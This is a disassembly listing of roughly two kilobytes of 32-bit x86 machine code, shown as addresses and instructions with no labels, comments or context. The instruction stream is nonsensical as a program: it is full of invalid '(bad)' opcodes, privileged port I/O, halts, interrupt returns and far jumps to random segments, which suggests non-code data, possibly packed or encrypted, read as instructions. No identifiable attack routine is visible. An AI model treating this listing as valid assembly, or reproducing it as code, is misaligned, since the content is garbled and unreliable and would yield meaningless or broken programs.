  415246:	add    BYTE PTR [eax],0x6b
  415249:	xchg   ebp,eax
  41524a:	sbb    DWORD PTR [esi+ebp*2+0x78cffbaf],esp
  415251:	xchg   edi,eax
  415252:	ret    0xfba6
  415255:	jmp    0x415257
  415257:	fsub   DWORD PTR [esp+edi*1]
  41525a:	xlat   BYTE PTR ds:[ebx]
  41525b:	ret    0xce28
  41525e:	es dec ebp
  415260:	repnz push 0xffffffe8
  415263:	iret   
  415264:	scas   al,BYTE PTR es:[edi]
  415265:	sahf   
  415266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415267:	mov    DWORD PTR [esi],edi
  415269:	lods   al,BYTE PTR ds:[esi]
  41526a:	clc    
  41526b:	push   edi
  41526c:	sar    DWORD PTR [ebx+0x6dbe4b95],0x99
  415273:	jg     0x4152e0
  415275:	sub    DWORD PTR [ebx],esp
  415277:	hlt    
  415278:	(bad)  
  415279:	mov    esp,0xea1664d5
  41527e:	repnz pop edi
  415280:	ss xchg edi,eax
  415282:	test   eax,0xbc8a70b
  415287:	out    0x10,al
  415289:	push   0x923d5e31
  41528e:	mov    bh,0x21
  415290:	rcr    edi,1
  415292:	xor    eax,0x23938cc8
  415297:	sbb    DWORD PTR [ebp-0x4d],ecx
  41529a:	push   ebp
  41529b:	inc    ebp
  41529c:	popf   
  41529d:	repz fidiv DWORD PTR ds:0xbd3fd210
  4152a4:	test   eax,0x75d0418a
  4152a9:	loope  0x4152e7
  4152ab:	mov    ebx,0x5311a695
  4152b0:	dec    ebx
  4152b1:	(bad)  
  4152b2:	push   ss
  4152b3:	mov    ah,0xcb
  4152b5:	imul   eax,DWORD PTR [esi+0x6faf9045],0x9c2701b1
  4152bf:	mov    ecx,0x180df0d2
  4152c4:	mov    BYTE PTR [edx+0x278288d6],bh
  4152ca:	cs pop ebp
  4152cc:	dec    eax
  4152cd:	jo     0x41532a
  4152cf:	fldcw  WORD PTR [esi+0x6267acc5]
  4152d5:	iret   
  4152d6:	push   0x3306e81d
  4152db:	sub    eax,0x3d6d3a7c
  4152e0:	push   ebp
  4152e1:	cwde   
  4152e2:	in     al,0x21
  4152e4:	mov    bh,0x16
  4152e6:	ds add eax,0x8707241d
  4152ec:	add    cl,ah
  4152ee:	lock jmp 0xcbb0:0x1767eae8
  4152f6:	or     al,0x2b
  4152f8:	xchg   DWORD PTR [eax],esp
  4152fa:	retf   0x4d8b
  4152fd:	pop    edi
  4152fe:	or     bl,BYTE PTR ds:0x1a854fc
  415304:	or     ah,BYTE PTR [ebx-0x47]
  415307:	push   0xffffffb6
  415309:	jns    0x41529e
  41530b:	cmp    DWORD PTR [edi],0x7e36bbee
  415311:	dec    ecx
  415312:	mov    ds:0x42e5de6d,eax
  415317:	pop    edi
  415318:	cdq    
  415319:	or     BYTE PTR [esi+0x31],bh
  41531c:	push   es
  41531d:	jle    0x41532a
  41531f:	retf   0xa2cb
  415322:	sahf   
  415323:	mov    cl,0xe4
  415325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415326:	mov    al,0xd7
  415328:	fs push esi
  41532a:	cwde   
  41532b:	icebp  
  41532c:	xchg   ch,dl
  41532e:	sub    BYTE PTR [ebp-0x33],ch
  415331:	push   esi
  415332:	cld    
  415333:	jecxz  0x415305
  415335:	mov    ds:0xb20cebb9,eax
  41533a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41533b:	dec    eax
  41533c:	mov    ah,0x66
  41533e:	jmp    0xb419:0x555bbe26
  415345:	cmp    al,0xb1
  415347:	cmc    
  415348:	sub    DWORD PTR ds:0xcbfbb14a,esp
  41534e:	daa    
  41534f:	lahf   
  415350:	or     bh,BYTE PTR [ebp+0x3d]
  415353:	mov    edx,eax
  415355:	xor    bl,bl
  415357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415358:	(bad)  
  415359:	mov    ebx,DWORD PTR [edx-0x1a]
  41535c:	imul   edi,edx,0x61
  41535f:	push   ebx
  415360:	inc    eax
  415361:	jmp    0x6f9f:0xea2f3a85
  415368:	xchg   esi,eax
  415369:	clc    
  41536a:	gs std 
  41536c:	push   0x6b
  41536e:	ret    
  41536f:	and    ah,ah
  415371:	sahf   
  415372:	ret    0x32f9
  415375:	sbb    edx,DWORD PTR [eax+0xe]
  415378:	jmp    0x4153a9
  41537a:	and    bh,BYTE PTR [ebp-0x6a39364e]
  415380:	enter  0x1212,0x31
  415384:	jns    0x41538d
  415386:	inc    edx
  415387:	mov    esp,0x7744b0a7
  41538c:	fisub  WORD PTR [eax+0x4c75d117]
  415392:	shr    BYTE PTR [edi-0x22],1
  415395:	aam    0x78
  415397:	inc    edx
  415398:	ja     0x4153ba
  41539a:	mov    esi,0x3a55e04e
  41539f:	fistp  DWORD PTR [ebx-0x4e8ec41c]
  4153a5:	data16 jo 0x41536e
  4153a8:	in     eax,dx
  4153a9:	push   esi
  4153aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ab:	pop    esi
  4153ac:	imul   esi,DWORD PTR [edi-0x30a7836b],0x631067e7
  4153b6:	sub    DWORD PTR [eax],edx
  4153b8:	pusha  
  4153b9:	and    BYTE PTR [ecx-0xc],dl
  4153bc:	ja     0x4153ef
  4153be:	push   0xffffff9e
  4153c0:	fcomp  DWORD PTR [ebx-0x4ab0d550]
  4153c6:	mov    ebp,esi
  4153c8:	inc    esi
  4153c9:	push   0xffffff97
  4153cb:	sbb    DWORD PTR ds:0x3610f72b,esp
  4153d1:	int3   
  4153d2:	cwde   
  4153d3:	inc    edi
  4153d4:	ins    DWORD PTR es:[edi],dx
  4153d5:	or     DWORD PTR [ebx+edi*4+0x60],esp
  4153d9:	retf   
  4153da:	lds    edx,FWORD PTR [esi]
  4153dc:	retf   0xf628
  4153df:	repz imul edx,DWORD PTR [ecx-0xbe20b83],0xfc7ad4de
  4153ea:	pop    esi
  4153eb:	iret   
  4153ec:	not    DWORD PTR [ebx-0x33]
  4153ef:	test   BYTE PTR [esi+0x77af0d49],dl
  4153f5:	mov    ds:0x2ddc4273,al
  4153fa:	pop    edx
  4153fb:	and    DWORD PTR [ecx],edi
  4153fd:	jmp    0x4153f2
  4153ff:	out    dx,al
  415400:	rcr    ecx,cl
  415402:	adc    BYTE PTR [eax+0x2cc9c49b],dl
  415408:	test   BYTE PTR [edx+eax*4-0x7d8f49c9],ah
  41540f:	inc    eax
  415410:	scas   eax,DWORD PTR es:[edi]
  415411:	mov    bh,0x8
  415413:	push   ds
  415414:	push   ebp
  415415:	lods   eax,DWORD PTR ds:[esi]
  415416:	mov    bx,WORD PTR [esi-0x85f2c2a]
  41541d:	xor    cl,al
  41541f:	ror    DWORD PTR ds:[ebp+0x21fe6d11],0x5
  415427:	adc    al,0x57
  415429:	inc    ebp
  41542a:	data16 test BYTE PTR es:[ebx],bl
  41542e:	xchg   edx,eax
  41542f:	imul   eax,DWORD PTR ds:0x656f100e,0x18
  415436:	and    al,0x38
  415438:	shl    DWORD PTR [ecx-0x10],0x9e
  41543c:	retf   0x6bfb
  41543f:	nop
  415440:	in     al,dx
  415441:	jae    0x4153ef
  415443:	and    BYTE PTR [ebp+0x5f],bl
  415446:	cmc    
  415447:	or     al,0xb2
  415449:	addr16 ret 
  41544b:	vsqrtsd xmm6,xmm1,xmm7
  41544f:	xor    DWORD PTR [ebx+0x78],edx
  415452:	mov    ebx,0xad77e5e8
  415457:	dec    eax
  415458:	mov    al,BYTE PTR [ecx]
  41545a:	cmc    
  41545b:	adc    eax,0x58e1adc
  415460:	add    DWORD PTR [eax],esi
  415462:	(bad)  
  415463:	call   0x8d32:0xd4d74be9
  41546a:	mov    al,0x73
  41546c:	js     0x41543b
  41546e:	repnz cli 
  415470:	out    dx,al
  415471:	(bad)  
  415472:	push   esp
  415473:	sub    BYTE PTR ds:0x333dcb1c,0x47
  41547a:	sbb    DWORD PTR [edi+0x70],ecx
  41547d:	add    al,0x8d
  41547f:	cmp    BYTE PTR [ebx+0x17],bl
  415482:	adc    eax,0xa4c90aee
  415487:	call   0x2319:0x7fc88432
  41548e:	cdq    
  41548f:	mov    WORD PTR [ebx+eiz*4+0x7b],?
  415493:	or     ah,al
  415495:	cli    
  415496:	xchg   esp,eax
  415497:	das    
  415498:	add    DWORD PTR [ebx+edi*1],edi
  41549b:	add    dl,cl
  41549d:	aaa    
  41549e:	xor    bh,BYTE PTR [ebp-0x35]
  4154a1:	fdivrp st(1),st
  4154a3:	pop    es
  4154a4:	ja     0x41542f
  4154a6:	imul   ecx,DWORD PTR [edi+esi*1+0x6f],0x718fc2b4
  4154ae:	pop    es
  4154af:	sub    al,cl
  4154b1:	adc    eax,0x994432fb
  4154b6:	cli    
  4154b7:	lahf   
  4154b8:	mov    edi,0xc1e32536
  4154bd:	sbb    ecx,eax
  4154bf:	mov    edx,DWORD PTR [esi-0x17]
  4154c2:	dec    eax
  4154c3:	dec    ecx
  4154c4:	lods   eax,DWORD PTR ds:[esi]
  4154c5:	and    ch,BYTE PTR [edi+edx*4+0x373f5569]
  4154cc:	(bad)  
  4154cd:	xchg   ebx,eax
  4154ce:	cmp    al,0xdf
  4154d0:	and    DWORD PTR [edi-0x1a01dcd5],0x3a
  4154d7:	sbb    ebp,DWORD PTR [esp+esi*4-0x29]
  4154db:	aam    0xf6
  4154dd:	imul   ecx,DWORD PTR [ecx-0xa],0x77
  4154e1:	lahf   
  4154e2:	ja     0x4154e9
  4154e4:	or     al,0xaf
  4154e6:	mov    WORD PTR [edx-0x78],es
  4154e9:	mov    ah,0x1f
  4154eb:	push   cs
  4154ec:	stos   BYTE PTR es:[edi],al
  4154ed:	mov    bl,dl
  4154ef:	push   cs
  4154f0:	daa    
  4154f1:	popa   
  4154f2:	or     esp,DWORD PTR [esi+0x22dc113]
  4154f8:	leave  
  4154f9:	mov    esi,DWORD PTR [ecx+0x665cfb7b]
  4154ff:	sub    DWORD PTR ds:0xc2823c87,esp
  415505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415506:	push   edx
  415507:	jmp    0x5c33:0xa904a2b3
  41550e:	cdq    
  41550f:	and    al,0xfa
  415511:	gs push edi
  415513:	data16 jb 0x415576
  415516:	push   ss
  415517:	xor    edi,0xa836fc08
  41551d:	lods   eax,DWORD PTR ds:[esi]
  41551e:	imul   edx,DWORD PTR [edi],0xffffffeb
  415521:	imul   esp,ecx,0x41
  415524:	or     eax,DWORD PTR [ebx+0x2a]
  415527:	out    0x93,eax
  415529:	shl    BYTE PTR [ecx-0x75],1
  41552c:	sti    
  41552d:	or     DWORD PTR [edx-0x6b],edi
  415530:	add    eax,0xf3869175
  415535:	dec    edi
  415536:	jbe    0x41550e
  415538:	sbb    ecx,edi
  41553a:	jge    0x4155b2
  41553c:	push   cs
  41553d:	jge    0x415533
  41553f:	ins    BYTE PTR es:[edi],dx
  415540:	mov    ecx,0xaa33c02f
  415545:	mov    dh,0x7f
  415547:	out    dx,eax
  415548:	aas    
  415549:	mov    ds:0xb75c349d,al
  41554e:	mov    esp,0x9d117199
  415553:	sbb    esp,esp
  415555:	adc    al,0x80
  415557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415558:	jne    0x4155c4
  41555a:	arpl   WORD PTR [ebp-0x18],cx
  41555d:	fucomip st,st(6)
  41555f:	sub    esp,DWORD PTR [eax-0x28]
  415562:	and    esp,DWORD PTR [ecx+0x5e]
  415565:	pushf  
  415566:	outs   dx,BYTE PTR ds:[esi]
  415567:	add    esp,DWORD PTR ds:0xa9707e0c
  41556d:	mov    DWORD PTR [edx],edx
  41556f:	sbb    edi,ebp
  415571:	shl    BYTE PTR [esi],0x41
  415574:	dec    esp
  415575:	repz popf 
  415577:	jmp    0x4155de
  415579:	into   
  41557a:	xchg   edi,eax
  41557b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41557c:	mov    bl,0x7
  41557e:	xchg   edx,eax
  41557f:	jl     0x41552c
  415581:	push   ss
  415582:	cmp    ecx,DWORD PTR [ebx+0x8d7be8a]
  415588:	mov    bl,0x8b
  41558a:	int    0xda
  41558c:	je     0x4155dd
  41558e:	mov    eax,0x7f16433c
  415593:	bsr    edi,DWORD PTR [ebx-0x594fd913]
  41559a:	xor    BYTE PTR [edx+ecx*2+0x10370571],bh
  4155a1:	push   0x7ed4aacc
  4155a6:	sti    
  4155a7:	xchg   esp,eax
  4155a8:	into   
  4155a9:	cmp    BYTE PTR [edx-0x3c03ad6a],dh
  4155af:	add    al,0x3c
  4155b1:	pusha  
  4155b2:	or     BYTE PTR [eax-0x1f0a8bb2],dh
  4155b8:	out    dx,eax
  4155b9:	maskmovq mm5,mm7
  4155bc:	inc    esi
  4155bd:	xchg   ecx,eax
  4155be:	push   ebx
  4155bf:	(bad)  
  4155c0:	outs   dx,DWORD PTR ds:[esi]
  4155c1:	out    0x4b,eax
  4155c3:	fcom   QWORD PTR [ecx]
  4155c5:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4155c7:	push   ss
  4155c8:	aam    0x59
  4155ca:	repnz call 0xf04a:0xb26eeae1
  4155d2:	shr    DWORD PTR [ebx+eax*2+0x42],cl
  4155d6:	pop    ss
  4155d7:	ret    0xfd29
  4155da:	push   0xf569a228
  4155df:	or     bh,bl
  4155e1:	mov    ds:0x8e6340a4,al
  4155e6:	jmp    0x2e7a:0x863a26de
  4155ed:	clc    
  4155ee:	or     BYTE PTR ds:0x2c6b0b2c,ch
  4155f4:	int    0xbf
  4155f6:	test   DWORD PTR [esp+ebp*1-0x147aa382],ebx
  4155fd:	mov    dh,0x62
  4155ff:	sbb    al,ch
  415601:	jle    0x415608
  415603:	dec    edi
  415604:	aaa    
  415605:	inc    ecx
  415606:	dec    esi
  415607:	mov    eax,0x435322ac
  41560c:	jmp    0x4728:0x9843d757
  415613:	mov    al,0x56
  415615:	cdq    
  415616:	jmp    0xd4e34cca
  41561b:	scas   al,BYTE PTR es:[edi]
  41561c:	mov    ah,0x77
  41561e:	hlt    
  41561f:	and    al,0xbd
  415621:	pusha  
  415622:	xchg   esi,eax
  415623:	gs das 
  415625:	jmp    0xae3:0xeee716bb
  41562c:	push   edi
  41562d:	test   BYTE PTR [ebp-0x52],ah
  415630:	outs   dx,DWORD PTR ds:[esi]
  415631:	rcr    BYTE PTR [eax],0x97
  415634:	mov    cs,WORD PTR [esi]
  415636:	push   ebx
  415637:	lea    esi,[edi]
  415639:	das    
  41563a:	aad    0x7f
  41563c:	ins    DWORD PTR es:[edi],dx
  41563d:	jbe    0x4155ca
  41563f:	retf   0x8063
  415642:	cmc    
  415643:	fwait
  415644:	out    dx,eax
  415645:	mov    edi,DWORD PTR [esi-0x13]
  415648:	sub    eax,0xa8f5149a
  41564d:	imul   esi,ebp,0x80a43808
  415653:	xor    al,0xed
  415655:	rcr    BYTE PTR ds:0x1e96025d,0x15
  41565c:	shr    BYTE PTR [eax],0xdc
  41565f:	icebp  
  415660:	dec    esi
  415661:	ds push 0x75
  415664:	div    dl
  415666:	icebp  
  415667:	mov    cl,0x22
  415669:	nop
  41566a:	sbb    BYTE PTR [ebx+eiz*8],0x40
  41566e:	jb     0x4156c6
  415670:	sahf   
  415671:	ds mov dh,0x56
  415674:	mov    edi,0x37cba91
  415679:	jmp    0xd555:0xdcd50a7c
  415680:	inc    edi
  415681:	xchg   DWORD PTR [esp+edi*4+0x8c2ede1],esi
  415688:	dec    esi
  415689:	mov    esi,0x958f59ff
  41568e:	inc    ebx
  41568f:	push   es
  415690:	mov    ecx,0xd8fc2848
  415695:	cmp    eax,0xfae0780
  41569a:	mov    al,ds:0xd2a8eef9
  41569f:	sub    esp,DWORD PTR [eax]
  4156a1:	pop    edx
  4156a2:	push   ebx
  4156a3:	aad    0x52
  4156a5:	out    dx,eax
  4156a6:	(bad)  
  4156a7:	aaa    
  4156a8:	xchg   ebp,eax
  4156a9:	cwde   
  4156aa:	pushf  
  4156ab:	cmp    eax,0x47cf54aa
  4156b0:	cld    
  4156b1:	cmp    BYTE PTR [edi+eax*1+0x6e06d190],bl
  4156b8:	loop   0x41565f
  4156ba:	arpl   WORD PTR [edi+ebp*4-0x77],ax
  4156be:	jp     0x41566b
  4156c0:	imul   edx,DWORD PTR [ebx+0x608c3bb7],0xffffffab
  4156c7:	xchg   DWORD PTR [edx+0xa094fd6],ebp
  4156cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ce:	call   0x5227:0x9fdd2afc
  4156d5:	push   ecx
  4156d6:	pop    ecx
  4156d7:	cmp    eax,0x116efcf2
  4156dc:	mov    esi,0xedc93c20
  4156e1:	dec    eax
  4156e2:	fwait
  4156e3:	in     eax,0x18
  4156e5:	fild   DWORD PTR [ebx-0x53]
  4156e8:	dec    ecx
  4156e9:	dec    ebp
  4156ea:	test   BYTE PTR [eax-0x1c],dh
  4156ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ee:	and    esi,DWORD PTR [esi+0x7e]
  4156f1:	push   ds
  4156f2:	fcom   st(0)
  4156f4:	hlt    
  4156f5:	mov    eax,0x2eaf81f5
  4156fa:	aas    
  4156fb:	sbb    al,0x3a
  4156fd:	scas   eax,DWORD PTR es:[edi]
  4156fe:	dec    eax
  4156ff:	cmp    edx,esp
  415701:	fs shr eax,cl
  415704:	adc    BYTE PTR cs:[ecx-0x17],0xfb
  415709:	(bad)  
  41570a:	pop    esp
  41570b:	and    al,0x1d
  41570d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41570e:	mov    bh,0xac
  415710:	hlt    
  415711:	and    ch,BYTE PTR [esi+0x6a]
  415714:	add    eax,0xba7d00cf
  415719:	mov    esp,ss
  41571b:	pop    edx
  41571c:	push   cs
  41571d:	mov    ebx,0xe77d4f65
  415722:	scas   al,BYTE PTR es:[edi]
  415723:	hlt    
  415724:	das    
  415725:	dec    ebx
  415726:	mov    esi,0x86de31af
  41572b:	pop    ds
  41572c:	mov    edx,0xbfe53334
  415731:	push   ebx
  415732:	(bad)  
  415733:	ds sub eax,0xa40e36c9
  415739:	xor    eax,0x32275b68
  41573e:	lods   al,BYTE PTR ds:[esi]
  41573f:	fimul  WORD PTR [edx-0x5f]
  415742:	xchg   BYTE PTR [esi-0x2a],bl
  415745:	lds    esp,FWORD PTR [edx+0x35]
  415748:	pop    eax
  415749:	ins    BYTE PTR es:[edi],dx
  41574a:	mov    al,ds:0xbea8ed8c
  41574f:	and    DWORD PTR [ebp-0x2153eda3],ebp
  415755:	scas   al,BYTE PTR es:[edi]
  415756:	xchg   DWORD PTR [ebp+0x2f],esp
  415759:	scas   eax,DWORD PTR es:[edi]
  41575a:	(bad)  
  41575b:	adc    al,0xd8
  41575d:	test   BYTE PTR [ecx+ebp*4-0xc],bh
  415761:	xchg   esp,eax
  415762:	and    ecx,DWORD PTR [ebx+0x6c]
  415765:	sub    al,0xa5
  415767:	add    eax,0xf3ea3362
  41576c:	xchg   esi,eax
  41576d:	jne    0x41578d
  41576f:	daa    
  415770:	pop    ebx
  415771:	and    eax,0x5bd63b6f
  415776:	jne    0x415730
  415778:	pop    esi
  415779:	test   bh,ah
  41577b:	xchg   BYTE PTR ds:0x48438c6a,al
  415781:	shl    BYTE PTR [eax-0x52dbb18c],0x2b
  415788:	and    eax,0x406ac176
  41578d:	in     al,dx
  41578e:	fst    DWORD PTR [eax]
  415790:	pop    edi
  415791:	inc    esi
  415792:	int3   
  415793:	cdq    
  415794:	int3   
  415795:	in     al,0x67
  415797:	imul   ebp,DWORD PTR [ebx+0x24],0xf6cbc362
  41579e:	and    BYTE PTR [esi+0x66],bh
  4157a1:	stc    
  4157a2:	adc    al,0x5
  4157a4:	aaa    
  4157a5:	jb     0x4157dd
  4157a7:	iret   
  4157a8:	ret    
  4157a9:	call   0xed5c1ad2
  4157ae:	ds jns 0x41581f
  4157b1:	xor    DWORD PTR [eax+0x4e],ecx
  4157b4:	cs push esp
  4157b6:	data16 std 
  4157b8:	jmp    0xb15ecb68
  4157bd:	xlat   BYTE PTR ds:[ebx]
  4157be:	xlat   BYTE PTR ds:[ebx]
  4157bf:	popf   
  4157c0:	pop    ds
  4157c1:	les    edx,FWORD PTR [esp+ebp*2-0x22]
  4157c5:	adc    BYTE PTR [edi+0x76f4f585],cl
  4157cb:	cmp    BYTE PTR [eax],dl
  4157cd:	inc    esi
  4157ce:	sub    ah,al
  4157d0:	out    0xf0,al
  4157d2:	add    al,0x50
  4157d4:	(bad)  
  4157d5:	neg    ecx
  4157d7:	xor    DWORD PTR [esi],ecx
  4157d9:	rcl    DWORD PTR [edi-0x7],0x4e
  4157dd:	dec    esp
  4157de:	ss out 0xbf,al
  4157e1:	int3   
  4157e2:	add    DWORD PTR [edi+edi*2+0x19152475],ebx
  4157e9:	add    bl,BYTE PTR [edx+0x3f2c2b04]
  4157ef:	pop    ecx
  4157f0:	ret    0x6e6b
  4157f3:	or     eax,0xbd8ff46a
  4157f8:	xchg   dl,cl
  4157fa:	adc    BYTE PTR [ebx-0x50],dl
  4157fd:	mov    ebx,0x18064943
  415802:	loopne 0x4157d7
  415804:	iret   
  415805:	push   0x17be1412
  41580a:	inc    edi
  41580b:	mov    bl,0x4e
  41580d:	sub    al,0x29
  41580f:	outs   dx,DWORD PTR ds:[esi]
  415810:	inc    ebx
  415811:	pop    esp
  415812:	call   0x7f89:0xb742aa19
  415819:	pop    ss
  41581a:	or     eax,DWORD PTR [edi+0x4f]
  41581d:	sbb    BYTE PTR ds:0xf9b0dc85,0xc7
  415824:	or     BYTE PTR [eax],dl
  415826:	out    0x6d,eax
  415828:	cld    
  415829:	pop    ebp
  41582a:	sub    DWORD PTR [ebp+0x1784e7ea],esi
  415830:	and    ch,BYTE PTR [ecx+eiz*2-0x31]
  415834:	fs xchg esi,eax
  415836:	jne    0x41580f
  415838:	pop    ebp
  415839:	xchg   ecx,eax
  41583a:	ror    DWORD PTR [edx-0x14f1c5ef],1
  415840:	es dec edi
  415842:	adc    DWORD PTR [ecx-0x18],0xffffffba
  415846:	dec    esi
  415847:	xchg   esi,eax
  415848:	rcl    DWORD PTR [edx],0x4f
  41584b:	test   DWORD PTR [ebx],esi
  41584d:	sbb    bl,BYTE PTR [ebp+0x3909f3c]
  415853:	or     al,0x7
  415855:	out    dx,al
  415856:	gs (bad) 
  415858:	xchg   ebx,eax
  415859:	out    dx,eax
  41585a:	into   
  41585b:	jmp    0x4157e4
  41585d:	scas   al,BYTE PTR es:[edi]
  41585e:	push   edi
  41585f:	dec    eax
  415860:	dec    ecx
  415861:	test   BYTE PTR [ebx-0x1b],bl
  415864:	retf   
  415865:	lods   eax,DWORD PTR ds:[esi]
  415866:	dec    ebp
  415867:	sub    al,BYTE PTR [edi+0x2bb5974f]
  41586d:	stc    
  41586e:	dec    esi
  41586f:	hlt    
  415870:	mov    edi,0xac4590a8
  415875:	rol    BYTE PTR [ebp-0x1d],0x95
  415879:	test   eax,0xb465c787
  41587e:	inc    ecx
  41587f:	and    eax,0x1c4cc537
  415884:	push   0xe1640d44
  415889:	loope  0x415812
  41588b:	sbb    al,0x80
  41588d:	xor    al,0xa2
  41588f:	mov    ecx,0x933fa031
  415894:	mov    BYTE PTR [ecx-0x990a7dd],bh
  41589a:	xor    ebp,DWORD PTR [esp+ecx*2-0x28]
  41589e:	mov    esi,0x86e07594
  4158a3:	jmp    0x4158b0
  4158a5:	ins    DWORD PTR es:[edi],dx
  4158a6:	jge    0x415857
  4158a8:	sbb    edi,DWORD PTR [edx-0x2cc937cd]
  4158ae:	mov    al,0x96
  4158b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158b1:	push   esi
  4158b2:	sbb    al,0xb3
  4158b4:	dec    esp
  4158b5:	and    DWORD PTR ds:0x59dd768b,ecx
  4158bb:	daa    
  4158bc:	(bad)  
  4158bd:	dec    ebp
  4158be:	sub    edi,DWORD PTR [edx+0x2b]
  4158c1:	jl     0x415934
  4158c3:	ins    BYTE PTR es:[edi],dx
  4158c4:	imul   BYTE PTR [ebx-0x65]
  4158c7:	ret    
  4158c8:	les    edi,FWORD PTR [eax+eax*4]
  4158cb:	sub    eax,0xbb86d058
  4158d0:	retf   0x846c
  4158d3:	repnz xchg ebp,eax
  4158d5:	xor    al,0xf4
  4158d7:	add    bl,al
  4158d9:	mov    WORD PTR [esi+0x1af66001],fs
  4158df:	sub    ebp,DWORD PTR [esi]
  4158e1:	jp     0x415947
  4158e3:	fbstp  TBYTE PTR [edi+0x217ab84e]
  4158e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158ea:	(bad)  
  4158eb:	ficomp DWORD PTR [esi]
  4158ed:	retf   0x304
  4158f0:	shl    ebx,cl
  4158f2:	out    dx,eax
  4158f3:	and    DWORD PTR [ebx],ecx
  4158f5:	sub    bl,cl
  4158f7:	loop   0x415962
  4158f9:	mov    eax,ds:0xa0315a94
  4158fe:	xchg   esi,eax
  4158ff:	addr16 pushf 
  415901:	and    BYTE PTR [ecx],0x3e
  415904:	sub    DWORD PTR [ecx+0x1e],ebp
  415907:	fs jg  0x415890
  41590a:	stc    
  41590b:	xor    bl,BYTE PTR [ebx-0x654e0515]
  415911:	das    
  415912:	jnp    0x41597d
  415914:	mov    eax,0x1a496ab8
  415919:	fs sub eax,0xbfbda574
  41591f:	pop    es
  415920:	(bad)  
  415921:	xchg   edi,eax
  415922:	popa   
  415923:	pop    esp
  415924:	xor    eax,0xacd3e7fa
  415929:	push   esi
  41592a:	or     al,0xa
  41592c:	mov    dl,bh
  41592e:	aam    0xfa
  415930:	loope  0x41598a
  415932:	call   0x326884df
  415937:	fs push 0x52
  41593a:	sbb    DWORD PTR [ebx+0x2ebdebca],0x3a
  415941:	loope  0x4159ab
  415943:	xor    BYTE PTR [ebp+0x8],al
  415946:	shr    DWORD PTR [esi+0x6061f7b5],0xa9
  41594d:	pop    es
  41594e:	dec    esp
  41594f:	add    BYTE PTR [edi-0x79],ch
  415952:	icebp  
  415953:	retf   0x7bd4
  415956:	popa   
  415957:	popf   
  415958:	mov    ds:0x2f1360de,al
  41595d:	test   BYTE PTR [eax],0x7b
  415960:	leave  
  415961:	inc    edx
  415962:	inc    esp
  415963:	mov    bl,0xe
  415965:	jg     0x4159a3
  415967:	inc    ebx
  415968:	arpl   WORD PTR [ecx],di
  41596a:	in     eax,0xba
  41596c:	jno    0x4159de
  41596e:	test   DWORD PTR [esi+0x4f9a8153],edi
  415974:	jge    0x415967
  415976:	mov    ds:0x787a8cb9,al
  41597b:	test   BYTE PTR [eax+0x738a4b5f],al
  415981:	(bad)  
  415982:	test   ecx,0xd4184bc4
  415988:	in     eax,0xdc
  41598a:	inc    ebx
  41598b:	push   es
  41598c:	je     0x415a02
  41598e:	aaa    
  41598f:	mov    DWORD PTR [edx],eax
  415991:	pop    edi
  415992:	cmp    al,al
  415994:	sbb    ebp,edx
  415996:	or     BYTE PTR [edx-0x7f5b07b4],ah
  41599c:	std    
  41599d:	enter  0xc951,0x47
  4159a1:	adc    eax,0x1fdb93a1
  4159a6:	ret    0x30de
  4159a9:	int    0xc1
  4159ab:	and    ecx,DWORD PTR [edx]
  4159ad:	or     al,0x1e
  4159af:	stos   DWORD PTR es:[edi],eax
  4159b0:	sbb    eax,0x43a44845
  4159b5:	mov    dl,0x20
  4159b7:	outs   dx,BYTE PTR ds:[esi]
  4159b8:	sahf   
  4159b9:	jmp    0x1720:0x2a7ddf5b
  4159c0:	bound  edx,QWORD PTR [ebx-0x4d]
  4159c3:	mov    dl,BYTE PTR [eiz*2-0x759a9b4d]
  4159ca:	mov    ds:0xc346b996,al
  4159cf:	fisttp WORD PTR [esi+0x6c8ba04d]
  4159d5:	xchg   edi,eax
  4159d6:	jecxz  0x415960
  4159d8:	imul   esi,esi,0x73af5d80
  4159de:	mov    ebx,DWORD PTR [ebx-0x1d]
  4159e1:	ror    BYTE PTR [ebx-0xc],cl
  4159e4:	icebp  
  4159e5:	sub    eax,0x5ff11148
  4159ea:	pop    ebp
  4159eb:	pop    ebp
  4159ec:	jmp    0xca9ba200
  4159f1:	and    bh,BYTE PTR [ecx+0x67]
  4159f4:	cwde   
  4159f5:	fild   WORD PTR [ecx+eax*4]
  4159f8:	or     al,0xfa
  4159fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159fb:	jmp    0x99eb1be4
  415a00:	or     DWORD PTR [edx],ecx
  415a02:	add    DWORD PTR [edx-0x2cd2e7de],edi
  415a08:	sbb    DWORD PTR [esi],ebx
  415a0a:	inc    edi
  415a0b:	or     eax,0x7f8198c1
  415a10:	pop    ebp
  415a11:	mov    ss,edi
  415a13:	out    dx,al
  415a14:	jge    0x4159ca
  415a16:	adc    dl,BYTE PTR [ecx+0x32da4003]
  415a1c:	inc    eax
  415a1d:	dec    esp
  415a1e:	out    dx,eax
  415a1f:	imul   esi,DWORD PTR [ebx+eiz*1],0x6c97461d
  415a26:	pushf  
  415a27:	out    dx,al
  415a28:	mov    DWORD PTR [ecx],ecx
  415a2a:	(bad)  
  415a2b:	jmp    0xe8eb:0x4b79d10e
  415a32:	iret   
  415a33:	ja     0x415a74
  415a35:	jecxz  0x4159f8
  415a37:	loopne 0x415aaf
  415a39:	lea    ebp,[ebp-0x6631a85e]
  415a3f:	cli    
  415a40:	sub    al,0x4d
  415a42:	dec    esi
  415a43:	out    0xa3,eax
  415a45:	(bad)  
  415a46:	outs   dx,DWORD PTR gs:[esi]
  415a48:	stos   DWORD PTR es:[edi],eax
  415a49:	iret   
  415a4a:	xor    edi,DWORD PTR [eax]
  415a4c:	add    ebp,DWORD PTR [bp+0x43]
  415a50:	fbstp  TBYTE PTR [ecx-0x7e365658]
